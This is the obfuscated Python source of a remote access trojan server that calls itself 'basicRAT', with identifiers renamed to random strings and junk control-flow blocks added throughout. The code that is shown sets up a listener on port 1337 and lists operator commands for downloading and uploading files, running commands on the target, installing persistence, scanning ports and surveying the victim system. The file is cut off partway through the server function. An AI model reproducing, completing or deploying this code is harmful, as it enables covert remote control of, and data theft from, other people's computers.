#!/usr/bin/env python

LztyPuzFAQiMBeEamFWyWRoHozqDmZRu = 'rylPzVnEZclXSYbPUNKUmJPtFEDSrjVl'
WMKjMuOMctYNPciyYcJDIuqDjoNVCYzS = 'nNtyOBegWBmnzuMQwIjcQacQoerzYiLy'
MmjGCWZUuGMGAPPmHMUCOckwyjaWDJVS = 'pQglPIWXxocPoBVmJbxpajkEpjIbZfsV'
gsRMthqEtuRIkqggLQlPbVSJgfmqwppQ = 'DvpXZkcmOEwQydqFBLgrNsbmVAPCFlOl'
viraulhVBfKynUmqAchmLHcUpKUhCAPq = 'lRYMwIidFqCySpLlbvvAgLzsjSWCqonO'
rsrztfsrTUjaIGiAAokrzceXQfwDOvxK = 'TgOJukeIvgZMQPTaHqITyGvpJEkrTqPm'
if MmjGCWZUuGMGAPPmHMUCOckwyjaWDJVS == gsRMthqEtuRIkqggLQlPbVSJgfmqwppQ:
    for rsrztfsrTUjaIGiAAokrzceXQfwDOvxK in viraulhVBfKynUmqAchmLHcUpKUhCAPq:
        if rsrztfsrTUjaIGiAAokrzceXQfwDOvxK == gsRMthqEtuRIkqggLQlPbVSJgfmqwppQ:
            viraulhVBfKynUmqAchmLHcUpKUhCAPq = LztyPuzFAQiMBeEamFWyWRoHozqDmZRu
        else:
            gsRMthqEtuRIkqggLQlPbVSJgfmqwppQ = WMKjMuOMctYNPciyYcJDIuqDjoNVCYzS
# -*- coding: utf-8 -*-

tcBdmDADMarEJFpwyLsbgzmBdZBJcexr = 'wWhUDmotOCZoYzxkxARaVERETcnCbABr'
sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne = 'PtPpyshvnrZkwyXSHqEcZXbhNPhaWHHR'
yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn = 'DSsLkYWJqKIgpKtOIUqOcKGQYCcUTUYM'
LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb = 'LLpTkGSNddcpzRdbkgJVsRPxUMXVkKVc'
if sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne == tcBdmDADMarEJFpwyLsbgzmBdZBJcexr:
    for tcBdmDADMarEJFpwyLsbgzmBdZBJcexr in sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne:
        if sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne == sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne:
            yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn = 'LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb'
        elif yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn == LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb:
            LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb = tcBdmDADMarEJFpwyLsbgzmBdZBJcexr
        else:
            tcBdmDADMarEJFpwyLsbgzmBdZBJcexr = sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne
elif yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn == yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn:
    for yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn in sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne:
        if LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb == sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne:
            yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn = 'LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb'
        elif yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn == LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb:
            LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb = tcBdmDADMarEJFpwyLsbgzmBdZBJcexr
        else:
            tcBdmDADMarEJFpwyLsbgzmBdZBJcexr = sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne
            for yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn in sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne:
                if LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb == sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne:
                    yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn = 'LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb'
                elif yDzFvAjhGXInjVmgTWBDnLqIQtcMYTUn == LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb:
                    LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb = tcBdmDADMarEJFpwyLsbgzmBdZBJcexr
                else:
                    tcBdmDADMarEJFpwyLsbgzmBdZBJcexr = LjvDxgsgNgqghMqttGqeYnfxQuNxTpyb
else:
    tcBdmDADMarEJFpwyLsbgzmBdZBJcexr = sfTKYZvzDIvsqGPLLEwJAawgwTaJUGne
import argparse

qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO = 'eueBoRNrDcddBiqEVjGqkgiUWoEpmyWJ'
XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF = 'FzRJzUHlfFmlZyiYFzynTvumuEeGEsqW'
XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu = 'hSvcRQhHaalYTJUhKlJVIlVzuVzDnECD'
LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX = 'EkrOhjdPKZaNVfDegdNMcNhvAjUaASNd'
if XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF == qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO:
    for qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO in XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF:
        if XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF == XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF:
            XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu = 'LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX'
        elif XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu == LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX:
            LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX = qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO
        else:
            qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO = XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF
elif XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu == XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu:
    for XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu in XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF:
        if LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX == XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF:
            XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu = 'LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX'
        elif XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu == LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX:
            LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX = qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO
        else:
            qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO = XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF
            for XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu in XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF:
                if LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX == XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF:
                    XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu = 'LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX'
                elif XSLsRuzrvGMGbEBMRSlHGyOWSMKzZvZu == LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX:
                    LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX = qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO
                else:
                    qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO = LwqjEcZcoFkLQkOTuMcHncXwWBjdnsJX
else:
    qhPJqUMGaVmGjPJFOdMhrJcWKpBWsUUO = XDleIfJrRlcrTYVgjxwJdgivjnQfRYxF
import readline

try:
    IYbZXkyMkAwCfnHOCjPZVDdVOquguNrc = 'yVGGUGcsOiVfqjUwpqjaTqxfsbNvxCIl'
    XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ = 'qMXGLkUMbvwlpnatSQApjcdGaXQADeuM'
    rlDJeXbQwrXKPOnmeSDGbbJkIUGkZihy = 'dLjCqBmyslvVqsCEmZMnXPFZWOIMniHK'
    rEiGdwGfXypUcHBowyXZHpiivnTZRjqz = 'QuhqfuReTNakTeRuWVMNCAYnbSyGBtNA'
    vLHoEVYLDLSMzFBRwZgMthuLqxuXamnL = 'JNyodhcwisysNziiQLmepmakqIwomyTW'
    VwzamfSBquVfxrDhakQqguWlUPkaTiXO = 'gwVHFpOsOYMxcYRiFfKSPgkSyiyvlWMk'
    SDWECFuDdUaOByJHASnPxtmlfeHRiMPT = [
            'yVGGUGcsOiVfqjUwpqjaTqxfsbNvxCIl',
            'dLjCqBmyslvVqsCEmZMnXPFZWOIMniHK',
            'JNyodhcwisysNziiQLmepmakqIwomyTW',
            'ZVikiNmYrkNrfLXUJBaKZxSNTZaIxKtL'
    ]
    for IYbZXkyMkAwCfnHOCjPZVDdVOquguNrc in VwzamfSBquVfxrDhakQqguWlUPkaTiXO:
        for XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ in rlDJeXbQwrXKPOnmeSDGbbJkIUGkZihy:
            if rEiGdwGfXypUcHBowyXZHpiivnTZRjqz == vLHoEVYLDLSMzFBRwZgMthuLqxuXamnL:
                XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ = IYbZXkyMkAwCfnHOCjPZVDdVOquguNrc
            elif vLHoEVYLDLSMzFBRwZgMthuLqxuXamnL == XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ:
                XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ = VwzamfSBquVfxrDhakQqguWlUPkaTiXO
            else:
                vLHoEVYLDLSMzFBRwZgMthuLqxuXamnL = VwzamfSBquVfxrDhakQqguWlUPkaTiXO
                for XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ in SDWECFuDdUaOByJHASnPxtmlfeHRiMPT:
                    rlDJeXbQwrXKPOnmeSDGbbJkIUGkZihy = XoPCkXQOsaydKZFVXcJVCtKzJQCVXukJ
except Exception:
    pass
import socket

try:
    jCdRPBQHTvMFoVghKaoSszCVwDuCZpyx = 'ditCAfrQDKcwxOuAeTsJoZZDQdRWrmxI'
    VpzvnaXBApvDEafTLwEetUmxsfbosnAy = 'yVeffJZLODbvYRqtUPrOvPgweYAUVsie'
    MdWZWrsxviKKGHVmKUalNwqDWoeJVKGg = 'HFFtgPIxtSqSAdTWgZmvrTtOYhoyksVp'
    xkzycxmQYCCnZEUqfgEkyKaAYzQZoNmV = 'OOESOuCqpAEYXfiXOAwFWFAedoSZqpss'
    TTjdgFjodhMhXuQDdGvYAwRIGGfWNiVb = 'xhSGmkrVBfyVflpRSUSJmvmvYFXFFIhG'
    oqXRBkWxFAPBwnDUiDAulCqdoLTOwkqc = 'MypAzCrrCEJNjvrdrYBHbZYUUYMCGspv'
    uZsnFcbyTXsiCGuAeSXkjBYTFkMnIWuO = [
            'ditCAfrQDKcwxOuAeTsJoZZDQdRWrmxI',
            'HFFtgPIxtSqSAdTWgZmvrTtOYhoyksVp',
            'xhSGmkrVBfyVflpRSUSJmvmvYFXFFIhG',
            'nEOiNDoczjppmxcOiYmhLibpAlzPBkzE'
    ]
    for jCdRPBQHTvMFoVghKaoSszCVwDuCZpyx in oqXRBkWxFAPBwnDUiDAulCqdoLTOwkqc:
        for VpzvnaXBApvDEafTLwEetUmxsfbosnAy in MdWZWrsxviKKGHVmKUalNwqDWoeJVKGg:
            if xkzycxmQYCCnZEUqfgEkyKaAYzQZoNmV == TTjdgFjodhMhXuQDdGvYAwRIGGfWNiVb:
                VpzvnaXBApvDEafTLwEetUmxsfbosnAy = jCdRPBQHTvMFoVghKaoSszCVwDuCZpyx
            elif TTjdgFjodhMhXuQDdGvYAwRIGGfWNiVb == VpzvnaXBApvDEafTLwEetUmxsfbosnAy:
                VpzvnaXBApvDEafTLwEetUmxsfbosnAy = oqXRBkWxFAPBwnDUiDAulCqdoLTOwkqc
            else:
                TTjdgFjodhMhXuQDdGvYAwRIGGfWNiVb = oqXRBkWxFAPBwnDUiDAulCqdoLTOwkqc
                for VpzvnaXBApvDEafTLwEetUmxsfbosnAy in uZsnFcbyTXsiCGuAeSXkjBYTFkMnIWuO:
                    MdWZWrsxviKKGHVmKUalNwqDWoeJVKGg = VpzvnaXBApvDEafTLwEetUmxsfbosnAy
except Exception:
    pass
import struct

hyPyNnBzWVOwOPrqGeHmwmahsELRBMGd = 'CHLBgJnaAoLCPtBLnhNrsXjCMTdqPTcJ'
yDrfCiERsVjwTVsksZGdMvHaBSyZadZa = 'YPaVsMehUFjXomYbCweTIhtphpjRFFhB'
if hyPyNnBzWVOwOPrqGeHmwmahsELRBMGd != yDrfCiERsVjwTVsksZGdMvHaBSyZadZa:
    hyPyNnBzWVOwOPrqGeHmwmahsELRBMGd = 'YPaVsMehUFjXomYbCweTIhtphpjRFFhB'
    yDrfCiERsVjwTVsksZGdMvHaBSyZadZa = hyPyNnBzWVOwOPrqGeHmwmahsELRBMGd
    hyPyNnBzWVOwOPrqGeHmwmahsELRBMGd = 'CHLBgJnaAoLCPtBLnhNrsXjCMTdqPTcJ'
import sys

try:
    OvoKdUcEpvveXcLtuzvVsBxKgPDmGjRT = 'smehCkuRCCjXLWIDBrPwNYRhLvQqrilt'
    ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn = 'EptTZTEIVJKsjwyyyBfDCDeCxClwkbYE'
    zSsHcPUwvoNoYdHBzQNPXpcGUPMduAar = 'baWDYdrHnmBFclPGcejDQCbnNSljsEGt'
    ZdSHdhLlSmvhthPonyZBOZuzDmpZdFzf = 'UhHucUjrpbxSRRAwOlqrJxVCktRDbAED'
    eNhCwIaqanlUJuHTOZCSxWSOMWJGPYUn = 'FakEKOmXTenvkwsVOyrrNleqEuFgPPhs'
    wHOSnzgZXsqtYMAgZhKjIisegsheSlUe = 'RmpMgIhGNwypkizZlskwlKQJYyKpZPHZ'
    KQtLrIPIzCWmsmVOxxFDzoyDDJQRjaea = [
            'smehCkuRCCjXLWIDBrPwNYRhLvQqrilt',
            'baWDYdrHnmBFclPGcejDQCbnNSljsEGt',
            'FakEKOmXTenvkwsVOyrrNleqEuFgPPhs',
            'yWegCLaeteibXwcvtxJbvThzxwrRykPO'
    ]
    for OvoKdUcEpvveXcLtuzvVsBxKgPDmGjRT in wHOSnzgZXsqtYMAgZhKjIisegsheSlUe:
        for ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn in zSsHcPUwvoNoYdHBzQNPXpcGUPMduAar:
            if ZdSHdhLlSmvhthPonyZBOZuzDmpZdFzf == eNhCwIaqanlUJuHTOZCSxWSOMWJGPYUn:
                ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn = OvoKdUcEpvveXcLtuzvVsBxKgPDmGjRT
            elif eNhCwIaqanlUJuHTOZCSxWSOMWJGPYUn == ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn:
                ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn = wHOSnzgZXsqtYMAgZhKjIisegsheSlUe
            else:
                eNhCwIaqanlUJuHTOZCSxWSOMWJGPYUn = wHOSnzgZXsqtYMAgZhKjIisegsheSlUe
                for ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn in KQtLrIPIzCWmsmVOxxFDzoyDDJQRjaea:
                    zSsHcPUwvoNoYdHBzQNPXpcGUPMduAar = ACpSOZXEBILRJLdSbHJHNwLMwdsoFmhn
except Exception:
    pass
import time

try:
    ObjWxljezCCVRYRusFYFEAkUWXXtoXrd = 'IwUGJbiryVBlWNeyoaNuzQSbOkkATYpD'
    QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH = 'ItgcIyFCnMwGOCRJvNGNdJHuqpMONuPg'
    HsXhAeUmaTncnJdKrKMeYihWNFDHPqwN = 'UFglllIWvyMdLyivaGBINPqyolZRzkry'
    ODEViKGdMMobhSPXKwvgdJVaeXQodnnY = 'yfmBsOjsWFQoJqWvDQKPnonRFivbngHG'
    GcEjdSsPhjEaCKXGiJrLvOQzXaAFHwZO = 'jCOMOUDdJNbquFUBJAsdZuWseULVYrhi'
    oXrDOnPHxoKGLgPadctCnpfoeIaebXAC = 'yqGnhJGqeTHPxYGqxujCWNPONvudAjJp'
    QsknPhMyGYRkzJaajrAOlpECCUWAXSNT = [
            'IwUGJbiryVBlWNeyoaNuzQSbOkkATYpD',
            'UFglllIWvyMdLyivaGBINPqyolZRzkry',
            'jCOMOUDdJNbquFUBJAsdZuWseULVYrhi',
            'aIHHdFkcmzojldqGgVWiEuXHhZQBoAbZ'
    ]
    for ObjWxljezCCVRYRusFYFEAkUWXXtoXrd in oXrDOnPHxoKGLgPadctCnpfoeIaebXAC:
        for QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH in HsXhAeUmaTncnJdKrKMeYihWNFDHPqwN:
            if ODEViKGdMMobhSPXKwvgdJVaeXQodnnY == GcEjdSsPhjEaCKXGiJrLvOQzXaAFHwZO:
                QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH = ObjWxljezCCVRYRusFYFEAkUWXXtoXrd
            elif GcEjdSsPhjEaCKXGiJrLvOQzXaAFHwZO == QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH:
                QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH = oXrDOnPHxoKGLgPadctCnpfoeIaebXAC
            else:
                GcEjdSsPhjEaCKXGiJrLvOQzXaAFHwZO = oXrDOnPHxoKGLgPadctCnpfoeIaebXAC
                for QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH in QsknPhMyGYRkzJaajrAOlpECCUWAXSNT:
                    HsXhAeUmaTncnJdKrKMeYihWNFDHPqwN = QpEwOyONxpzGZcEEMBoeSrFmbFbDzGsH
except Exception:
    pass
try:

    vIBVOvJlGuXPpYZlejFcLRRcmKufpHOj = 'lydXBKSULwYVapdyOkUoYYrnSZqmJzrd'
    fHvKqPKcQwiIblRGoawAcmmNhZNDrrDu = 'xaRSwmyKbhHwaCDQbpaJUkSENfXfUvSX'
    if vIBVOvJlGuXPpYZlejFcLRRcmKufpHOj != fHvKqPKcQwiIblRGoawAcmmNhZNDrrDu:
        vIBVOvJlGuXPpYZlejFcLRRcmKufpHOj = 'xaRSwmyKbhHwaCDQbpaJUkSENfXfUvSX'
        fHvKqPKcQwiIblRGoawAcmmNhZNDrrDu = vIBVOvJlGuXPpYZlejFcLRRcmKufpHOj
        vIBVOvJlGuXPpYZlejFcLRRcmKufpHOj = 'lydXBKSULwYVapdyOkUoYYrnSZqmJzrd'
    from core.nRCQFariepVHzPRgWueSCcSNIpMrGeVq import VZGbVmtqTmDOEQHhKIeKvmdxXyGUEXLA,PAMNmxJnmkQDYgiKaSUrJWZEsURKKAib,oNZYiYHmYKBhkOiCodDdHRZcATGFPzLg

    dusQKSnbTSAEZdLJIDIQQkzfmmjhPOdF = 'QDzEipKlFNQEpasCLRXrDOxSoiUYIdHD'
    MhhUxWnbozcDNLEEfwVdmzCsKZZNogCB = 'MJQKfcIYmtIEZsAdMbOGMRheTKfFFypp'
    RVOkvOCtuhTgyarpnVWMvlCxvlDSXIeG = 'FfvPgkUlxLDKnjAUdFYcNGTnYhOevDaV'
    AePxxSSJZrjGYwxJyFWjsMkXGjjxWRxf = 'FdLyijOHfUYQahWoLjDTxluhmKewMKKr'
    LjAdrEgBSZitrCyCnQQThFngPvMvGPUy = 'mtRwaSDzINgoXBgHcaeBDSOjZLvTzZXm'
    KKkwzPumIWvBzOILqUgHuPESdjTgQDlw = 'kppzTpuNXtuCzhQlIajOcfoxQYDsHPwx'
    if RVOkvOCtuhTgyarpnVWMvlCxvlDSXIeG == AePxxSSJZrjGYwxJyFWjsMkXGjjxWRxf:
        for KKkwzPumIWvBzOILqUgHuPESdjTgQDlw in LjAdrEgBSZitrCyCnQQThFngPvMvGPUy:
            if KKkwzPumIWvBzOILqUgHuPESdjTgQDlw == AePxxSSJZrjGYwxJyFWjsMkXGjjxWRxf:
                LjAdrEgBSZitrCyCnQQThFngPvMvGPUy = dusQKSnbTSAEZdLJIDIQQkzfmmjhPOdF
            else:
                AePxxSSJZrjGYwxJyFWjsMkXGjjxWRxf = MhhUxWnbozcDNLEEfwVdmzCsKZZNogCB
    from core.WrdYkeIxHpEWpYCxWFPSghInPCcPGYMM import UKljRqYmyRjdhxzdwCmbaZADNXeYjPzg, ehRKSVQWUJyNRXJlOKfRDOvOWCanPXzl

    cLwxtOnDmtEEyeGkjOEFoOKKWdRrJoPH = 'thfXRVNmmAHLpbUDobCAfLslKtvfDcQt'
    BOuPdxEiTPaooyxkzKlReCqfuzhOmmOJ = 'hHcrObDsGtHrNcmFkHcbUWkAiNlIRxna'
    if cLwxtOnDmtEEyeGkjOEFoOKKWdRrJoPH != BOuPdxEiTPaooyxkzKlReCqfuzhOmmOJ:
        cLwxtOnDmtEEyeGkjOEFoOKKWdRrJoPH = 'hHcrObDsGtHrNcmFkHcbUWkAiNlIRxna'
        BOuPdxEiTPaooyxkzKlReCqfuzhOmmOJ = cLwxtOnDmtEEyeGkjOEFoOKKWdRrJoPH
        cLwxtOnDmtEEyeGkjOEFoOKKWdRrJoPH = 'thfXRVNmmAHLpbUDobCAfLslKtvfDcQt'
except ImportError as HyuxhUTajPpKCWhRkLKqqZJEgSPOedLe:

    KryHCkDwJVbpgVIxUZxpGSEOrEVWfXbW = 'LgieJrFTHgLPfSBOhNtTFbCNihiagQon'
    CUUwpMXGWQxrBDhVsoReWYjLZXnHheKT = 'eCsOVrdTnnrxgQQfgEOIGjcNSAnwqQnL'
    uFBFrbnGymnQiytjXzEtJPlssXXEzqCp = 'UltyEjIlDwmCtmnqRTyYTjDdppOMIvnZ'
    DNWDlySomivOQlcwLZrIKgRMKJgmmXId = 'INwqZCiMPdzgGFmbRZVnMFgxDgbaaWCR'
    wNUxsLFeNDtvqOCQkcsDhBcMHLGUopjc = 'ZKPKxZoxCwDDNOveFhoNOQykZPvuPNjS'
    rAgIhccMavGWaJNNdqqfwjSwVcJTtxCV = 'upNBuAJgQEPQWJnBsbnWfhCqXdpDpekN'
    if uFBFrbnGymnQiytjXzEtJPlssXXEzqCp == DNWDlySomivOQlcwLZrIKgRMKJgmmXId:
        for rAgIhccMavGWaJNNdqqfwjSwVcJTtxCV in wNUxsLFeNDtvqOCQkcsDhBcMHLGUopjc:
            if rAgIhccMavGWaJNNdqqfwjSwVcJTtxCV == DNWDlySomivOQlcwLZrIKgRMKJgmmXId:
                wNUxsLFeNDtvqOCQkcsDhBcMHLGUopjc = KryHCkDwJVbpgVIxUZxpGSEOrEVWfXbW
            else:
                DNWDlySomivOQlcwLZrIKgRMKJgmmXId = CUUwpMXGWQxrBDhVsoReWYjLZXnHheKT
    print HyuxhUTajPpKCWhRkLKqqZJEgSPOedLe

    QXLVAlChoFUelPUNRYTgCpZoStPLRCfu = 'dbpstHfUgAQozjQZTBQNRFwvKQxFFOzh'
    JsFmOvJBULcIRtCNgwblMgulquoVixnh = 'PtSLBhTXintAVsKERXXDRfEipoiAYuoy'
    KaPlZXpkDdIxvVkRBbImOLfrVFksobTq = 'JbPHxWThjBMHKYuGmlvynQUuLbEEkwyu'
    vfGLRXzNEWzlBOOuWuYldcSUIMgtegAU = 'AQIWRiKeOsAKxTQLIYCqQPKqWaxCjpiD'
    ojzoATPMrgmvXtQmThlfBcaIbegDtcMz = 'BMjBWtuigmILrdAReTtyyompzkNHFLAS'
    wIHBQFqyEzNEKYBzGuCjesCMLiibnPla = 'inkpwIYFLbCwARHaoYMgVvZzPGhjHPFg'
    if QXLVAlChoFUelPUNRYTgCpZoStPLRCfu != vfGLRXzNEWzlBOOuWuYldcSUIMgtegAU:
        JsFmOvJBULcIRtCNgwblMgulquoVixnh = KaPlZXpkDdIxvVkRBbImOLfrVFksobTq
        for wIHBQFqyEzNEKYBzGuCjesCMLiibnPla in vfGLRXzNEWzlBOOuWuYldcSUIMgtegAU:
            if wIHBQFqyEzNEKYBzGuCjesCMLiibnPla != KaPlZXpkDdIxvVkRBbImOLfrVFksobTq:
                JsFmOvJBULcIRtCNgwblMgulquoVixnh = JsFmOvJBULcIRtCNgwblMgulquoVixnh
            else:
                ojzoATPMrgmvXtQmThlfBcaIbegDtcMz = QXLVAlChoFUelPUNRYTgCpZoStPLRCfu
    else:
        KaPlZXpkDdIxvVkRBbImOLfrVFksobTq = QXLVAlChoFUelPUNRYTgCpZoStPLRCfu
        QXLVAlChoFUelPUNRYTgCpZoStPLRCfu = ojzoATPMrgmvXtQmThlfBcaIbegDtcMz
        if KaPlZXpkDdIxvVkRBbImOLfrVFksobTq == QXLVAlChoFUelPUNRYTgCpZoStPLRCfu:
            for wIHBQFqyEzNEKYBzGuCjesCMLiibnPla in QXLVAlChoFUelPUNRYTgCpZoStPLRCfu:
                if wIHBQFqyEzNEKYBzGuCjesCMLiibnPla == KaPlZXpkDdIxvVkRBbImOLfrVFksobTq:
                    KaPlZXpkDdIxvVkRBbImOLfrVFksobTq = QXLVAlChoFUelPUNRYTgCpZoStPLRCfu
                else:
                    KaPlZXpkDdIxvVkRBbImOLfrVFksobTq = ojzoATPMrgmvXtQmThlfBcaIbegDtcMz
    sys.exit(0)
etrMyKRfRoADdEjiKJAjESpKKyKsaWst = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
DDBQOozeTzbgdlcLQpotKhCGBZFvDUPg = '''
______           _     ______  ___ _____   _            _   
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |  
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_ 
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_ 
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
                                                            
'''
bhZPwyVUzTxRHSlXUHZCVZXxkyAPJDnV = [ 
            'download', 'help', 'persistence', 'quit', 'rekey', 
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget' 
]
def LMezmXEjVrcIgPcMzDcjNwsUFfURDqlk():
    FilBPHczFXfBJUggZNPXSuOVjGBywdRj = argparse.ArgumentParser(description='basicRAT server')
    FilBPHczFXfBJUggZNPXSuOVjGBywdRj.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return FilBPHczFXfBJUggZNPXSuOVjGBywdRj
def qiMWPvHvljyCdHbajcSUdpxLsWQPxUNF():
    FilBPHczFXfBJUggZNPXSuOVjGBywdRj  = LMezmXEjVrcIgPcMzDcjNwsUFfURDqlk()
    gwNMNuIORYEynrfYycKWEejzRXSefkgt    = vars(FilBPHczFXfBJUggZNPXSuOVjGBywdRj.parse_args())
    uhFFevieeGsuCqFtwCxJWXQdoymyzkCf    = gwNMNuIORYEynrfYycKWEejzRXSefkgt['port']
    bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:

        EHjwUuzTULbDEXfwbXCbNkUMeOXvaQjf = 'MzDYceiDYXhfxOScUiBIyLSajJTNRxmG'
        vYemgLJenIcDdGyoeJoacREiPrylJLEb = 'glyKthBUlWcSmCOZgcbQLLpYKfoLTETv'
        xfAwuBHeWBACTYuladTZLxSCcJhgnDPz = 'gRCKxFUoPKqFPMELAHkxmJuIaDiUUhlo'
        TpVLaSbhSDBFuchnnzwCtfbLtQUKooxc = 'CHSNpKpqUDoxvVvcEFNoirvCiAqDmShh'
        VHqAxkymroRFGkGawyytKmqtQgubBFXI = 'RRDLhRakQedHaIlMhzgUzsgqZTJLAYFo'
        JCjzGpZJTOzQjjhLKgaLgpXQuPXfZsLD = 'PmpkFXxZtuLDPBCEkrvdakYqEWmgNoCl'
        if xfAwuBHeWBACTYuladTZLxSCcJhgnDPz == TpVLaSbhSDBFuchnnzwCtfbLtQUKooxc:
            for JCjzGpZJTOzQjjhLKgaLgpXQuPXfZsLD in VHqAxkymroRFGkGawyytKmqtQgubBFXI:
                if JCjzGpZJTOzQjjhLKgaLgpXQuPXfZsLD == TpVLaSbhSDBFuchnnzwCtfbLtQUKooxc:
                    VHqAxkymroRFGkGawyytKmqtQgubBFXI = EHjwUuzTULbDEXfwbXCbNkUMeOXvaQjf
                else:
                    TpVLaSbhSDBFuchnnzwCtfbLtQUKooxc = vYemgLJenIcDdGyoeJoacREiPrylJLEb
        bmaWIfGjeoERFbkYOFbaWMNBukqpXfbv.bind(('0.0.0.0', uhFFevieeGsuCqFtwCxJWXQdoymyzkCf))
    except socket.error:

        MPwFIaJdrKUxXzbXQHjCNffaCNQIcaVu = 'IleiyMhVKpFDHfmPlJUdWgadzxScdPyr'
        SfOEsIWyjkYQeQXKpbgqwRGTFVxxJdEO = 'DijTAbmlcuGRjmbiRmInkRnnpNzoerBx'
        NOysPFpIGUPemYYjlhwxSlzBpXxgqRVN = 'HgZjdxOZhcSheFbuaMYkDOaRBwRuqeqg'
        if MPwFIaJdrKUxXzbXQHjCNffaCNQIcaVu == SfOEsIWyjkYQeQXKpbgqwRGTFVxxJdEO:
